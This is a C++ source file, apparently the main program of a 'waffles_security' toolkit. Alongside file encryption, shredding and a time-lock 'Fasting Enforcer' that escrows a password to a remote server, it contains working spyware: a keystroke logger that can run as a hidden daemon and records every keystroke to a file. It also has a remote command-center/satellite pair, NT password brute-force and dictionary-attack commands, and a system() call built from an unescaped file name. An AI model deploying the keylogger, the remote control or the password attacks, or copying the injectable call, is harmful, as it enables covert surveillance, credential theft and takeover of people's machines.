	passphrase[len + sl] = '\0';
}

#define DECRYPT_BLOCK_SIZE 2048

void decryptFile(const char* source, char* passphrase, char* outSalt, std::string* pBaseName)
{
	// Open the file and measure its length
	std::ifstream ifs;
	ifs.exceptions(std::ios::failbit|std::ios::badbit);
	ifs.open(source, std::ios::binary);
	ifs.seekg(0, std::ios::end);
	size_t len = (size_t)ifs.tellg();
	ifs.seekg(0, std::ios::beg);

	// Read the salt
	ifs.read(outSalt, SALT_LEN);
	len -= SALT_LEN;
	appendSalt(passphrase, outSalt);

	// Decrypt it
	size_t origLen = len;
	size_t prevLen = len;
	GFolderDeserializer fd(pBaseName);
	GCrypto crypto(passphrase, strlen(passphrase));
	char* pBuf = new char[DECRYPT_BLOCK_SIZE];
	std::unique_ptr<char[]> hBuf(pBuf);
	bool first = true;
	while(len > 0)
	{
		size_t chunkSize = std::min(len, (size_t)DECRYPT_BLOCK_SIZE);
		ifs.read(pBuf, chunkSize);
		len -= chunkSize;
		crypto.doChunk(pBuf, chunkSize);
		if(first)
		{
			first = false;
			if(memcmp(pBuf, "ugfs", 4) != 0 && memcmp(pBuf, "cgfs", 4) != 0)
				throw Ex("The passphrase is incorrect");
		}
		fd.doNext(pBuf, chunkSize);
		if(prevLen - len >= 10000)
		{
			cout << "      \r" << (0.01 * floor(float(origLen - len) * 10000 / origLen)) << "%";
			cout.flush();
			prevLen = len;
		}
	}
	cout << "\rDone.          \n";
}


































class FastConnection : public GDynamicPageConnection
{
public:
	FastConnection(SOCKET sock, GDynamicPageServer* pServer) : GDynamicPageConnection(sock, pServer)
	{
	}
	
	virtual ~FastConnection()
	{
	}

	virtual void handleRequest(GDynamicPageSession* pSession, std::ostream& response);

};

class FastServer : public GDynamicPageServer
{
public:
	std::string m_basePath;

	FastServer(int port, GRand* pRand) : GDynamicPageServer(port, pRand) {}
	virtual ~FastServer() {}
	virtual void onEverySixHours() {}
	virtual void onStateChange() {}
	virtual void onShutDown() {}

	virtual GDynamicPageConnection* makeConnection(SOCKET sock)
	{
		return new FastConnection(sock, this);
	}
};

// virtual
void FastConnection::handleRequest(GDynamicPageSession* pSession, std::ostream& response)
{
	if(strcmp(m_szUrl, "/favicon.ico") == 0)
		return;
	GHttpParamParser parser(this->m_szParams);
	response << "<html><head>\n";
	response << "	<title>The Fasting Enforcer</title>\n";
	response << "</head><body>\n";
	const char* filename = parser.find("filename");
	if(filename)
	{
		time_t tNow = time(0);
		struct tm dest;
		localtime_r(&tNow, &dest);
		const char* szYear = parser.find("year");
		const char* szMonth = parser.find("month");
		const char* szDay = parser.find("day");
		const char* szHour = parser.find("hour");
		const char* szMinute = parser.find("minute");
		const char* szServer = parser.find("server");
		const char* szName = parser.find("uid");
		if(!szYear || !szMonth || !szDay || !szHour || !szMinute || !szServer || !szName)
		{
			response << "Missing parameter. I am not going to lock it.";
		}
		else
		{
			dest.tm_year = atoi(szYear) - 1900;
			dest.tm_mon = atoi(szMonth) - 1;
			dest.tm_mday = atoi(szDay);
			dest.tm_hour = atoi(szHour);
			dest.tm_min = atoi(szMinute);
			time_t destTime = mktime(&dest);
			double duration = destTime - tNow;
			if(duration < 0)
			{
				response << "That is in the past. I am not going to lock it.";
			}
			else if(duration > 90 * 24 * 60 * 60)
			{
				response << "That would be more than 90 days! I am going to assume it was an error and not lock it.";
			}
			else
			{
				// Measure the clock skew
				const char* szpretime = "name=\"date\" value=\"";
				size_t resp1Size;
				unsigned char* pResp1 = downloadFromWeb(szServer, 60, &resp1Size);
				std::unique_ptr<unsigned char[]> hResp1(pResp1);
				char* pServerTime = strstr((char*)pResp1, szpretime);
				size_t servertime = atol(pServerTime + strlen(szpretime));
				time_t timenow = time(NULL);
				ssize_t skew = (ssize_t)servertime - (ssize_t)timenow;
				cout << "Clock skew: " << to_str(skew) << "\n";

				// Generate a password
				char pw[33 + SALT_LEN];
				GRand rand(getpid() * time(NULL));
				for(size_t i = 0; i < 32 + SALT_LEN; i++)
					pw[i] = 'a' + rand.next(26);
				pw[32] = '\0';

				// Notify the server
				size_t responseSize;
				string query = szServer;
				query += "?put=";
				query += szName;
				query += "&value=";
				query += pw;
				query += "&date=";
				query += to_str(timenow + duration + skew);
				unsigned char* pResponse = downloadFromWeb(query.c_str(), 60, &responseSize);
				std::unique_ptr<unsigned char[]> hResponse(pResponse);
				char* pUntil = strstr((char*)pResponse, "until ");
				if(!pUntil)
					throw Ex("Unexpected response from server: ", (char*)pResponse);

				// Encrypt the path
				string s = filename;
				s += ".encrypted";
				encryptPath(filename, pw, s.c_str(), false);
				if(unlink(filename) != 0)
					throw Ex("Error deleting the file ", filename);

				response << "<h2>The file has been locked</h2>\n";
				response << "Have a nice day!";
				m_pServer->shutDown();
			}
		}
	}
	else
	{
		response << "<h2>The Fasting Enforcer</h2>\n";
		char cwdbuf[256];
		const char* cwd = getcwd(cwdbuf, 256);
		response << "<table>\n";
		char timebuf[256];
		const char* curTime = GTime::asciiTime(timebuf, 256);
		response << "<tr><td align=right>Time:</td><td>" << curTime << "</tr>\n";
		response << "<tr><td>Current folder:</td><td>" << cwd << "</td></tr>\n";
		response << "<tr><td valign=top align=right>Files:</td><td>";
		vector<string> files;
		GFile::fileList(files);
		string def;
		for(size_t i = 0; i < files.size(); i++) {
			PathData pd;
			GFile::parsePath(files[i].c_str(), &pd);
			if(def.length() == 0 || strcmp(files[i].c_str()+ pd.extStart, ".exe") == 0)
				def = files[i];
			response << files[i] << "<br>\n";
		}
		time_t tnow = time(0);
		struct tm* cur_time = localtime(&tnow);

		response << "</td></tr>\n";
		response << "</table><br><br>\n";
		response << "<form method=\"get\"><table>\n";
		response << "<tr><td align=right>Lock the file</td><td><input type=\"string\" name=\"filename\" size=\"100\" value=\"" << def << "\"></td></tr>\n";
		response << "<tr><td align=right>Until</td><td>";
		response << " Year:<input type=\"string\" name=\"year\" size=\"4\" value=\"" << to_str(cur_time->tm_year + 1900) << "\">";
		response << " Month:<input type=\"string\" name=\"month\" size=\"3\" value=\"" << to_str(cur_time->tm_mon + 1) << "\">";
		response << " Day:<input type=\"string\" name=\"day\" size=\"3\" value=\"" << to_str(cur_time->tm_mday) << "\">";
		response << " Hour:<input type=\"string\" name=\"hour\" size=\"3\" value=\"" << to_str(cur_time->tm_hour) << "\">";
		response << " Minute:<input type=\"string\" name=\"minute\" size=\"3\" value=\"0\"></td></tr>\n";
		response << "<tr><td></td><td><input type=\"hidden\" name=\"server\" value=\"uaf46365.ddns.uark.edu/escrow/escrow.php\">\n";
		response << "<input type=\"hidden\" name=\"uid\" value=\"lol\">\n";
		response << "<input type=\"submit\" value=\"Lock\"></td></tr>\n";
		response << "</table></form>\n";

	}
	response << "</body></html>\n";
}

void fast(GArgReader& args)
{
	GRand rand(0);
	FastServer server(8983, &rand);
	GApp::openUrlInBrowser(server.myAddress());
	server.go();
}





void feast(GArgReader& args)
{
	string def;
	const char* szServer = "uaf46365.ddns.uark.edu/escrow/escrow.php";
	const char* szName = "lol";
	while(args.next_is_flag())
	{
		if(args.if_pop("-file"))
			def = args.pop_string();
		else if(args.if_pop("-server"))
			szServer = args.pop_string();
		else if(args.if_pop("-uid"))
			szName = args.pop_string();
		else
			throw Ex("Invalid option: ", args.peek());
	}
	if(def.length() == 0)
	{
		vector<string> files;
		GFile::fileList(files);
		for(size_t i = 0; i < files.size(); i++) {
			PathData pd;
			GFile::parsePath(files[i].c_str(), &pd);
			if(strcmp(files[i].c_str()+ pd.extStart, ".encrypted") == 0)
				def = files[i];
		}
	}
	if(def.length() == 0)
	{
		char cwdbuf[256];
		const char* cwd = getcwd(cwdbuf, 256);
		throw Ex("No encrypted files were found in ", cwd);
	}
	const char* pathName = def.c_str();

	// Notify the server
	size_t responseSize;
	string query = szServer;
	query += "?get=";
	query += szName;
	unsigned char* pResponse = downloadFromWeb(query.c_str(), 60, &responseSize);
	std::unique_ptr<unsigned char[]> hResponse(pResponse);
	char* pUntil = strstr((char*)pResponse, "until ");
	if(pUntil)
	{
		cout << pResponse << "\n\n";
		return;
	}

	// Decrypt
	char passphrase[MAX_PASSPHRASE_LEN];
	strcpy(passphrase, (char*)pResponse);
	string basename;
	char salt[SALT_LEN];
	salt[0] = '\0';
	decryptFile(pathName, passphrase, salt, &basename);
	if(unlink(pathName) != 0)
		throw Ex("Error deleting the file ", pathName);
}

void find(GArgReader& args)
{
	const char* szFilename = args.pop_string();
	const char* szNeedle = args.pop_string();

	size_t fileSize;
	std::ifstream ifs;
	ifs.exceptions(std::ios::failbit|std::ios::badbit);
	try
	{
		ifs.open(szFilename, std::ios::binary);
		ifs.seekg(0, std::ios::end);
		fileSize = (size_t)ifs.tellg();
		ifs.seekg(0, std::ios::beg);
	}
	catch(const std::exception&)
	{
		throw Ex("Error while trying to open the file, ", szFilename, ". ", strerror(errno));
	}

	size_t needleLen = strlen(szNeedle);
	size_t bulkSize = 8192;
	if(needleLen > bulkSize)
		throw Ex("big needle");
	size_t bufSize = bulkSize + needleLen;
	char* pBuf = new char[bufSize + 1];
	std::unique_ptr<char[]> hBuf(pBuf);
	size_t overflow = 0;
	size_t pos = 0;
	while(fileSize > 0)
	{
		memcpy(pBuf, pBuf + bulkSize, overflow);
		size_t readLen = std::min(fileSize, bufSize - overflow);
		ifs.read(pBuf + overflow, readLen);
		size_t dataLen = overflow + readLen;
		overflow = dataLen - bulkSize;
		size_t searchSize = dataLen - std::min(dataLen, needleLen);
		fileSize -= readLen;

		char* pB = pBuf;
		for(size_t i = 0; i < searchSize; i++)
		{
			bool found = true;
			char* pBB = pB;
			const char* pNeed = szNeedle;
			for(size_t j = 0; j < needleLen; j++)
			{
				if(*pBB != *pNeed)
				{
					found = false;
					break;
				}
				pBB++;
				pNeed++;
			}
			if(found)
			{
				cout << to_str(pos + i) << "\n";
			}
			pB++;
		}
		pos += searchSize;
	}
}

void nthash(GArgReader& args)
{
	unsigned char hash[16];
	nthash(args.pop_string(), hash);
	char hex[33];
	GBits::bufferToHexBigEndian(hash, 16, hex);
	hex[32] = '\0';
	cout << hex << "\n";
}

const char* g_szMagicCombo = "xqwertx";
#define MAGIC_LEN 7

class KeystrokeSniffer
{
protected:
	GKeyboard* m_pKeyboard;
	FILE* m_pLogFile;
	int m_nMagicPos;

public:
	KeystrokeSniffer(const char* szFilename)
	{
		m_nMagicPos = 0;
		m_pLogFile = fopen(szFilename, "a");
		if(!m_pLogFile)
			throw "Failed to open log file\n";
		char buf[64];
		fprintf(m_pLogFile, "\n== Begin at %s ==\n", GTime::asciiTime(buf, 64, false));
		m_pKeyboard = new GKeyboard(KeyStrokeHandler, this);
	}

	~KeystrokeSniffer()
	{
		delete(m_pKeyboard);
		char buf[64];
		fprintf(m_pLogFile, "\n== End at %s ==\n", GTime::asciiTime(buf, 64, false));
		fclose(m_pLogFile);
	}

	static void KeyStrokeHandler(void* pThis, char c)
	{
		((KeystrokeSniffer*)pThis)->OnKeyStroke(c);
	}

	void Watch()
	{
		m_pKeyboard->Watch();
	}

	void Stop()
	{
		m_pKeyboard->Stop();
	}

	void OnKeyStroke(char c)
	{
		fputc(c, m_pLogFile);
		if(rand() % 100 == 0)
			fflush(m_pLogFile);
		if(c == g_szMagicCombo[m_nMagicPos])
		{
			if(++m_nMagicPos >= MAGIC_LEN)
				Stop();
		}
		else
			m_nMagicPos = 0;
	}

	static void doLogging(void* filename)
	{
		const char* szFilename = (const char*)filename;
		try
		{
			KeystrokeSniffer ks(szFilename);
			ks.Watch();
		}
		catch(std::exception&)
		{
//			fprintf(stderr, e.what());
		}
	}

	static void logKeyStrokes(GArgReader& args)
	{
		const char* szFilename = args.pop_string();
		bool daemon = false;
		while(args.next_is_flag())
		{
			if(args.if_pop("-daemon"))
				daemon = true;
			else
				throw Ex("Invalid option: ", args.peek());
		}
		if(daemon)
			GApp::launchDaemon(doLogging, (void*)szFilename);
		else
			doLogging((void*)szFilename);
	}
};




int wget(GArgReader& args)
{
	const char* url = args.pop_string();
	const char* filename = args.pop_string();
	size_t size;
	char* pFile = (char*)downloadFromWeb(url, 20, &size);
	std::unique_ptr<char[]> hFile(pFile);
	GFile::saveFile(pFile, size, filename);
	return 0;
}

void doCommandCenter(GArgReader& args)
{
	int port = 6831;
	while(args.next_is_flag())
	{
		if(args.if_pop("-port"))
			port = args.pop_uint();
		else
			throw Ex("Invalid option: ", args.peek());
	}
	doShellCommandCenter(port);
}

int doSatellite(GArgReader& args)
{
	const char* szAddr = "localhost";
	int connectInterval = 60 * 10;
	int timeoutSecs = 120;
	int port = 6831;
	while(args.next_is_flag())
	{
		if(args.if_pop("-connectinterval"))
			connectInterval = args.pop_uint();
		else if(args.if_pop("-addr"))
			szAddr = args.pop_string();
		else if(args.if_pop("-port"))
			port = args.pop_uint();
		else
			throw Ex("Invalid option: ", args.peek());
	}
        Satellite sat;
        sat.Go(szAddr, port, connectInterval, timeoutSecs);
        return 0;
}
/*
int doLogin(GArgReader& args)
{
	LoginController c;
	c.RunModal();
	return 0;
}
*/

void readInPassphrase(char* pBuf, size_t len, char* pSalt = NULL)
{
	cout << "Please enter the passphrase: ";
	cout.flush();
	GPassiveConsole pc(false);
	while(true)
	{
		char c = pc.getChar();
		if(c != '\0')
		{
			if(c == '\r' || c == '\n')
				break;
			if(len > 1)
			{
				*pBuf = c;
				pBuf++;
				len--;
			}
		}
		else
			GThread::sleep(10);
	}
	*pBuf = '\0';
	cout << "\r                                                   \r";
	cout.flush();

	// Read the salt
	if(pSalt)
	{
		size_t remaining = SALT_LEN;
		cout << "\rPlease enter " << remaining << " chars of throw-away salt";
		cout.flush();
		GPassiveConsole pc2(false);
		while(remaining > 0)
		{
			char c = pc2.getChar();
			if(c != '\0')
			{
				remaining--;
				pSalt[remaining] = c;
				cout << "\rPlease enter " << remaining << " chars of throw-away salt";
				cout.flush();
			}
			else
				GThread::sleep(10);
		}
		cout << "\r                                                   \r";
		cout.flush();
	}
}

class PassphraseWiper
{
public:
	char* m_pBuf;
	PassphraseWiper(char* pBuf) : m_pBuf(pBuf) {}
	~PassphraseWiper()
	{
		memset(m_pBuf, '\0', MAX_PASSPHRASE_LEN);
	}
};

void decrypt(GArgReader& args)
{
	const char* filename = args.pop_string();
	char passphrase[MAX_PASSPHRASE_LEN];
	readInPassphrase(passphrase, MAX_PASSPHRASE_LEN);
	PassphraseWiper pw(passphrase);
	char salt[SALT_LEN];
	decryptFile(filename, passphrase, salt, NULL);
}

void encrypt(GArgReader& args)
{
	// Get the source path
	const char* pathName = args.pop_string();

	// Options
	string sPath = pathName;
	if(sPath.length() > 0 && (sPath[sPath.length() - 1] == '/' || sPath[sPath.length() - 1] == '\\'))
		sPath.erase(sPath.length() - 1);
	PathData pd;
	GFile::parsePath(sPath.c_str(), &pd);
	string sTarget;
	sTarget.assign(pathName + pd.fileStart, pd.extStart - pd.fileStart);
	sTarget.append(".encrypted");
	bool compress = false;
	while(args.next_is_flag())
	{
		if(args.if_pop("-out"))
			sTarget = args.pop_string();
		else if(args.if_pop("-compress"))
			compress = true;
		else
			throw Ex("Invalid option: ", args.peek());
	}
	char passphrase[MAX_PASSPHRASE_LEN];
	char salt[SALT_LEN];
	readInPassphrase(passphrase, MAX_PASSPHRASE_LEN, salt);
	PassphraseWiper pw(passphrase);
	appendSalt(passphrase, salt);
	encryptPath(pathName, passphrase, sTarget.c_str(), compress);
}

#ifdef WINDOWS
// Iterate the top-level windows. Encapsulates ::EnumWindows.
class CWindowIterator {
protected:
   HWND* m_hwnds;          // array of hwnds for this PID
   DWORD m_nAlloc;         // size of array
   DWORD m_count;          // number of HWNDs found
   DWORD m_current;        // current HWND
   static BOOL CALLBACK EnumProc(HWND hwnd, LPARAM lp);
   // virtual enumerator
   virtual BOOL OnEnumProc(HWND hwnd);
   // override to filter different kinds of windows
   virtual BOOL OnWindow(HWND hwnd) {return TRUE;}
public:
   CWindowIterator(DWORD nAlloc=1024);
   ~CWindowIterator();

   DWORD GetCount() { return m_count; }
   HWND First();
   HWND Next() {
      return m_hwnds && m_current < m_count ? m_hwnds[m_current++] : NULL;
   }
};

// Iterate the top-level windows in a process.
class CMainWindowIterator : public CWindowIterator  {
protected:
   DWORD m_pid;                     // process id
   virtual BOOL OnWindow(HWND hwnd);
public:
   CMainWindowIterator(DWORD pid, DWORD nAlloc=1024);
   ~CMainWindowIterator();
};

CWindowIterator::CWindowIterator(DWORD nAlloc)
{
   GAssert(nAlloc > 0);
   m_current = m_count = 0;
   m_hwnds = new HWND [nAlloc];
   m_nAlloc = nAlloc;
}

CWindowIterator::~CWindowIterator()
{
   delete [] m_hwnds;
}

HWND CWindowIterator::First()
{
   ::EnumWindows(EnumProc, (LPARAM)this);
   m_current = 0;
   return Next();
}

// Static proc passes to virtual fn.
BOOL CALLBACK CWindowIterator::EnumProc(HWND hwnd, LPARAM lp)
{
   return ((CWindowIterator*)lp)->OnEnumProc(hwnd);
}

// Virtual proc: add HWND to array if OnWindow says OK
BOOL CWindowIterator::OnEnumProc(HWND hwnd)
{
   if (OnWindow(hwnd)) {
      if (m_count < m_nAlloc)
         m_hwnds[m_count++] = hwnd;
   }
   return TRUE; // keep looking
}

CMainWindowIterator::CMainWindowIterator(DWORD pid, DWORD nAlloc)
   : CWindowIterator(nAlloc)
{
   m_pid = pid;
}

CMainWindowIterator::~CMainWindowIterator()
{
}

// virtual override: is this window a main window of my process?
BOOL CMainWindowIterator::OnWindow(HWND hwnd)
{
   if (GetWindowLong(hwnd,GWL_STYLE) & WS_VISIBLE) {
      DWORD pidwin;
      GetWindowThreadProcessId(hwnd, &pidwin);
      if (pidwin==m_pid)
         return TRUE;
   }
   return FALSE;
}
#endif // WINDOWS

void OpenFile(const char* szFilename)
{
#ifdef WINDOWS
	SHELLEXECUTEINFO sei;
	memset(&sei, '\0', sizeof(SHELLEXECUTEINFO));
	sei.cbSize = sizeof(SHELLEXECUTEINFO);
	sei.fMask = SEE_MASK_NOCLOSEPROCESS/* | SEE_MASK_NOZONECHECKS*/;
	sei.hwnd = NULL;
	sei.lpVerb = NULL;
	sei.lpFile = szFilename;
	sei.lpParameters = NULL;
	sei.lpDirectory = NULL;
	sei.nShow = SW_SHOW;
	ShellExecuteEx(&sei);
	CMainWindowIterator itw((DWORD)sei.hProcess/*pid*/);
	SetForegroundWindow(itw.First());
	//ShellExecute(NULL, NULL, szFilename, NULL, NULL, SW_SHOW);
#else
#ifdef DARWIN
	// Mac
	GTEMPBUF(char, pBuf, 32 + strlen(szFilename));
	strcpy(pBuf, "open ");
	strcat(pBuf, szFilename);
	strcat(pBuf, " &");
	system(pBuf);
#else // DARWIN
	GTEMPBUF(char, pBuf, 32 + strlen(szFilename));

	// Gnome
	strcpy(pBuf, "gnome-open ");
	strcat(pBuf, szFilename);
	if(system(pBuf) != 0)
	{
		// KDE
		//strcpy(pBuf, "kfmclient exec ");
		strcpy(pBuf, "konqueror ");
		strcat(pBuf, szFilename);
		strcat(pBuf, " &");
		if(system(pBuf) != 0)
			cout << "Failed to open " << szFilename << ". Please open it manually.\n";
	}
#endif // !DARWIN
#endif // !WINDOWS
}

void open(GArgReader& args)
{
	const char* filename = args.pop_string();
	char passphrase[MAX_PASSPHRASE_LEN];
	readInPassphrase(passphrase, MAX_PASSPHRASE_LEN);
	PassphraseWiper pw(passphrase);
	string basename;
	char salt[SALT_LEN];
	decryptFile(filename, passphrase, salt, &basename);
	OpenFile(basename.c_str());
	while(true)
	{
#ifndef WINDOWS
		cout << "(You can press CTRL-z to suspend, then enter \"fg\" to resume.)\n";
#endif
		cout << "When you are done with the files, please close any programs that\n";
		cout << "were used to view or edit them, then choose one of these options:\n";
		cout << "	q) Quit (Just shred any changes).\n";
		cout << "	s) Save changes and re-encrypt.\n";
		//cout << "	l) Leave the files decrypted. (Never choose this option.)\n";
		cout << "Enter your choice (q or s)? ";
		cout.flush();
		char choice[1024];
		cin.getline(choice, 1023);
		if(_stricmp(choice, "q") == 0)
		{
			shred(basename.c_str());
			break;
		}
		else if(_stricmp(choice, "s") == 0)
		{
			// Determine a name to back up the old encrypted file to
			string backupname = filename;
			backupname += ".backup";

			// Delete any file with the backup name
			if(access(backupname.c_str(), 0) == 0)
			{
				if(unlink(backupname.c_str()) != 0)
					throw Ex("Error deleting the file ", backupname.c_str());
			}

			// Rename the old encrypted file to the backup name
			if(rename(filename, backupname.c_str()) != 0)
				throw Ex("Error renaming old encryped file");

			// Re-encrypt the files
			encryptPath(basename.c_str(), passphrase, filename, false);

			// Shred the files
			shred(basename.c_str());

			// Delete the old encrypted file
			if(unlink(backupname.c_str()) != 0)
				throw Ex("Error deleting the file ", backupname.c_str());
			break;
		}
		else if(_stricmp(choice, "l") == 0)
			break;
		cout << "\n\nInvalid choice: \"" << choice << "\".\n\n";
	}
}

void grep(GArgReader& args)
{
	const char* filename = args.pop_string();
	const char* needle = args.pop_string();
	char passphrase[MAX_PASSPHRASE_LEN];
	readInPassphrase(passphrase, MAX_PASSPHRASE_LEN);
	PassphraseWiper pw(passphrase);
	string basename;
	char salt[SALT_LEN];
	decryptFile(filename, passphrase, salt, &basename);
	char buf[8192];
	std::ifstream ifs(basename.c_str());
	while(true)
	{
		ifs.getline(buf, 8192);
		if(ifs.eof())
			break;
		if(strstr(buf, needle))
			cout << buf << "\n";
	}
	shred(basename.c_str());
}
/*
void socketClient(GArgReader& args)
{
	const char* szAddr;
	int port = 8080;
	while(args.next_is_flag())
	{
		if(args.if_pop("-port"))
			port = (int)args.pop_uint();
		else if(args.if_pop("-addr"))
			szAddr = args.pop_string();
		else
			throw Ex("Invalid option: ", args.peek());
	}
	
	GTCPClient client;
	client.connect(szAddr, port);
	while(true)
	{
		
	}
}
*/
void socketServer(GArgReader& args)
{
	int port = 8080;
	while(args.next_is_flag())
	{
		if(args.if_pop("-port"))
			port = (int)args.pop_uint();
		else
			throw Ex("Invalid option: ", args.peek());
	}

	GTCPServer server(port);
	char buf[257];
	GTCPConnection* pConn;
	while(true)
	{
		size_t n = server.receive(buf, 256, &pConn);
		if(n > 0)
		{
			buf[n] = '\0';
			std::cout << buf;
		}
		GThread::sleep(100);
	}
}

void ShowUsage()
{
	cout << "Full Usage Information\n";
	cout << "[Square brackets] are used to indicate required arguments.\n";
	cout << "<Angled brackets> are used to indicate optional arguments.\n";
	cout << "\n";
	UsageNode* pUsageTree = makeCryptoUsageTree();
	std::unique_ptr<UsageNode> hUsageTree(pUsageTree);
	pUsageTree->print(cout, 0, 3, 76, 1000, true);
	cout.flush();
}

void showError(GArgReader& args, const char* szMessage)
{
	cerr << "_________________________________\n";
	cerr << szMessage << "\n\n";
	args.set_pos(1);
	const char* szCommand = args.peek();
	UsageNode* pUsageTree = makeCryptoUsageTree();
	std::unique_ptr<UsageNode> hUsageTree(pUsageTree);
	if(szCommand)
	{
		UsageNode* pUsageCommand = pUsageTree->choice(szCommand);
		if(pUsageCommand)
		{
			cerr << "Brief Usage Information:\n\n";
			cerr << "waffles_security ";
			pUsageCommand->print(cerr, 0, 3, 76, 1000, true);
		}
		else
		{
			cerr << "Brief Usage Information:\n\n";
			pUsageTree->print(cerr, 0, 3, 76, 1, false);
		}
	}
	else
	{
		pUsageTree->print(cerr, 0, 3, 76, 1, false);
		cerr << "\nFor more specific usage information, enter as much of the command as you know.\n";
	}
	cerr << "\nTo see full usage information, run:\n	waffles_security usage\n\n";
//	cerr << "For a graphical tool that will help you to build a command, run:\n	waffles_wizard\n";
	cerr.flush();
}

void doit(GArgReader& args)
{
	if(args.size() < 1) throw Ex("Expected a command");
	else if(args.if_pop("usage")) ShowUsage();
	else if(args.if_pop("bandwidthclient")) doBandwidthClient(args);
	else if(args.if_pop("bandwidthserver")) doBandwidthServer(args);
	//else if(args.if_pop("li")) doLogin(args);
	else if(args.if_pop("bruteforcentpassword")) bruteForceNTPassword(args);
	else if(args.if_pop("findbrokenlinks")) findbrokenlinks(args);
	else if(args.if_pop("dictattackntpassword")) dictAttackNTPassword(args);
	else if(args.if_pop("dump")) dump(args);
	else if(args.if_pop("fast")) fast(args);
	else if(args.if_pop("feast")) feast(args);
	else if(args.if_pop("find")) find(args);
	else if(args.if_pop("commandcenter")) doCommandCenter(args);
	else if(args.if_pop("decrypt")) decrypt(args);
	else if(args.if_pop("encrypt")) encrypt(args);
	else if(args.if_pop("logkeys")) KeystrokeSniffer::logKeyStrokes(args);
	else if(args.if_pop("makegarbage")) makeGarbage(args);
	else if(args.if_pop("nthash")) nthash(args);
	else if(args.if_pop("open")) open(args);
	else if(args.if_pop("grep")) grep(args);
	else if(args.if_pop("satellite")) doSatellite(args);
	//else if(args.if_pop("socketclient")) socketClient(args);
	else if(args.if_pop("socketserver")) socketServer(args);
	else if(args.if_pop("shred")) shred(args);
	else if(args.if_pop("wget")) wget(args);
	else throw Ex("Unrecognized command: ", args.peek());
}

#ifdef WINDOWS
#	ifndef _DEBUG
#		define USE_WINMAIN
#	endif
#endif


#ifdef NOCONSOLE
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Parse the args
	GTEMPBUF(char, buf, strlen(lpCmdLine));
	strcpy(buf, lpCmdLine);
	bool quot = false;
	int start = 0;
	vector<const char*> args;
	for(int i = 0; buf[i] != '\0'; i++)
	{
		if(!quot)
		{
			if(buf[i] == '"')
				quot = true;
			else
			{
				if(buf[i] == ' ')
				{
					args.push_back(buf + start);
					buf[i] = '\0';
					start = i + 1;
				}
			}
		}
		else
		{
			if(buf[i] == '"')
				quot = false;
		}
	}
	args.push_back(buf + start);
	GTEMPBUF(char*, argv, args.size() + 1);
	for(size_t i = 0; i < args.size(); i++)
		argv[i] = (char*)args[i];
	argv[args.size()] = NULL;
	GArgReader argReader(args.size(), argv);
	try
	{
		doit(argReader);
	}
	catch(std::exception& e)
	{
		showError(argReader, e.what());
	}
}

#else
int main(int argc, char *argv[])
{
#ifdef _DEBUG
	GApp::enableFloatingPointExceptions();
#endif
	int nRet = 1;
	GArgReader args(argc, argv);
	args.pop_string(); // advance past the app name
	try
	{
		doit(args);
		nRet = 0;
	}
	catch(std::exception& e)
	{
		showError(args, e.what());
	}

	return nRet;
}
#endif // !USE_WINMAIN

